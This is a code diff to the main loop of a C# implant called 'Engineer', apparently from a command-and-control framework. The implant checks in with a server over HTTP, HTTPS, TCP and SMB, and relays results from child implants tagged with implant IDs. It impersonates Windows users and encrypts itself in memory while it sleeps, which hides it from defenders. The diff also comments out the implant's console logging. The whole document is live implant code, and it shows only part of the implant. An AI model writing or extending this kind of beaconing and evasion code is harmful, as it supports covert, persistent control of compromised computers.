@@ -10,6 +10,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Reflection;
 using System.Security.Principal;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -23,8 +24,6 @@ namespace Engineer
         internal static WindowsIdentity ImpersonatedUser;
         internal static bool ImpersonatedUserChanged = false;
         internal static List<EngineerCommand> _commands = new List<EngineerCommand>(); // Assigned here because its not assigned in main so assigning it somewhere else would localsize the assignment other 3 are assigned the objects in Main func.
-        internal static int InboundCommandsRec = 0;
-        internal static int OutboundResponsesSent = 0;
         public static string ManagerType = "{{REPLACE_MANAGER_TYPE}}";
         public static ConcurrentDictionary<string, EngTCPComm> TcpChildCommModules = new ConcurrentDictionary<string, EngTCPComm>(); // key is the current engineers children engineerId, value is the TCP comm, for that child
         public static ConcurrentDictionary<string, EngSMBComm> SmbChildCommModules = new ConcurrentDictionary<string, EngSMBComm>(); // key is the current engineers children engineerId, value is the smb comm, for that child
@@ -41,6 +40,7 @@ namespace Engineer
         public static bool IsTaskExecuting = false;
         public static SleepEnum.SleepTypes Sleeptype = Enum.TryParse("{{REPLACE_SLEEP_TYPE}}", out SleepEnum.SleepTypes sleeptype) ? sleeptype : SleepEnum.SleepTypes.None;
         public static DateTime LastP2PCheckIn = DateTime.Now;
+        public static string ImplantType = "{{REPLACE_IMPLANT_TYPE}}";
 
         public static async Task Main(string[] args)
         {
@@ -122,25 +122,26 @@ namespace Engineer
                             ImpersonatedUserChanged = false;
                         }
 
-                        if (InboundCommandsRec == OutboundResponsesSent)
-                        {
-                            IsTaskExecuting = false;
-                        }
-                        else
+                        //if tasking.EngTaskResults contains any tasks with the status of running then IsTaskExecuting = true
+                        if (Tasking.engTaskResultDic.Any(x => x.Value.Status == EngTaskStatus.Running))
                         {
                             IsTaskExecuting = true;
                         }
-                        
+                        else
+                        {
+                            IsTaskExecuting = false;
+                        }
+
 
                         //send task output
                         if (!_commModule.Outbound.IsEmpty)
                         {
-                            await _commModule.PostData();   //send task response data to server
+                           await Task.Run(() =>_commModule.PostData());   //send task response data to server
                         }
                         else if (ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase) || ManagerType.Equals("https", StringComparison.CurrentCultureIgnoreCase))
                         {
                             //get tasks
-                            await _commModule.CheckIn();      //http checkin with server
+                           await Task.Run(() => _commModule.CheckIn());      //http checkin with server
                         }
                         if (_commModule.RecvData(out var tasks))
                         {
@@ -150,17 +151,28 @@ namespace Engineer
                         {
                            // Console.WriteLine($"{DateTime.UtcNow} tcp engineer has p2p outbound to put in parents queue");
                             //if this child has a finished task result place it into the queue for the parent to pick up
-                            EngTCPComm.ChildToParentData[TcpParentCommModules.Keys.ElementAt(0)].Enqueue(_commModule.P2POutbound.TryDequeue(out var data) ? data : null); 
+                            var childData = _commModule.P2POutbound.TryDequeue(out var data) ? data : null;
+                            if (childData != null)
+                            {
+                                var implant_id_bytes = Encoding.UTF8.GetBytes(_metadata.Id);
+                                var implantIdLength = BitConverter.GetBytes(implant_id_bytes.Length);
+                                var childData_w_id = implantIdLength.Concat(implant_id_bytes).Concat(childData).ToArray();
+                                EngTCPComm.ChildToParentData[TcpParentCommModules.Keys.ElementAt(0)].Enqueue(childData_w_id);
+                            }
                         }
                         while (!_commModule.P2POutbound.IsEmpty && ManagerType.Equals("smb", StringComparison.CurrentCultureIgnoreCase))
                         {
                             //Console.WriteLine("smb engineer has p2p outbound to put in parents queue");
                             //if this child has a finished task result place it into the queue for the parent to pick up
-                            EngSMBComm.ChildToParentData[SmbParentCommModules.Keys.ElementAt(0)].Enqueue(_commModule.P2POutbound.TryDequeue(out var data) ? data : null); 
-                            if (EngSMBComm.ChildToParentData[SmbParentCommModules.Keys.ElementAt(0)].Count > 0)
+                            var childData = _commModule.P2POutbound.TryDequeue(out var data) ? data : null;
+                            if (childData != null)
                             {
-                              //  Console.WriteLine("smb engineer queued data for parent");
+                                var implant_id_bytes = Encoding.UTF8.GetBytes(_metadata.Id);
+                                var implantIdLength = BitConverter.GetBytes(implant_id_bytes.Length);
+                                var childData_w_id = implantIdLength.Concat(implant_id_bytes).Concat(childData).ToArray();
+                                EngSMBComm.ChildToParentData[SmbParentCommModules.Keys.ElementAt(0)].Enqueue(childData_w_id);
                             }
+                            
                         }
                         //while the parent has data from a child send it to the ts
                         while (!_commModule.P2POutbound.IsEmpty && (ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase) || ManagerType.Equals("https", StringComparison.CurrentCultureIgnoreCase)))
@@ -170,24 +182,15 @@ namespace Engineer
                             await test.Postp2pData();
                         }
                         
-                        //if tasking.EngTaskResults contains any tasks with the status of running then IsTaskExecuting = true
-                        if(Tasking.engTaskResultDic.Any(x => x.Value.Status == EngTaskStatus.Running))
-                        {
-                            IsTaskExecuting = true;
-                        }
-                        else
-                        {
-                            IsTaskExecuting = false;
-                        }
+                        
                         
                         //meed to modify this so it can be interruppted, if another thread finishes a task or p2p data is ready to be sent it shouldnt have to keep waiting for the sleep time to finish
                         if(IsTaskExecuting && EngCommBase.Sleep > 0)
                         {
                             Thread.Sleep(EngCommBase.Sleep);
                         }
-
                         //sleep and encrypt
-                        if (!(IsTaskExecuting) && EngCommBase.Sleep > 1000 && !(isInjected) && EngTCPComm.IsDataInTransit == false && EngSMBComm.IsDataInTransit == false)
+                        else if (!(IsTaskExecuting) && EngCommBase.Sleep > 1000 && !(isInjected) && EngTCPComm.IsDataInTransit == false && EngSMBComm.IsDataInTransit == false)
                         {
                             IsEncrypted = true;
                             if (Sleeptype == SleepEnum.SleepTypes.Custom_RC4)
@@ -207,7 +210,7 @@ namespace Engineer
                             Thread.Sleep(10);
                         }
                         //helps with cpu use
-                        Thread.Sleep(10);
+                        Thread.Sleep(5);
                         
                         
                         
@@ -246,16 +249,16 @@ namespace Engineer
                     }
                     catch (Exception ex)
                     {
-                       // Console.WriteLine(ex.Message);
-                       // Console.WriteLine(ex.StackTrace);
+                       //Console.WriteLine(ex.Message);
+                       //Console.WriteLine(ex.StackTrace);
                     }
                 }
                 Stop();
             }
             catch (Exception e)
             {
-               // Console.WriteLine(e.Message);
-               // Console.WriteLine(e.StackTrace);
+               //Console.WriteLine(e.Message);
+               //Console.WriteLine(e.StackTrace);
             }
         }
 
@@ -297,7 +300,7 @@ namespace Engineer
 
         public static void Stop()
         {
-            Console.WriteLine("Token cancelled");
+            //Console.WriteLine("Token cancelled");
             _tokenSource.Cancel();
         }
 
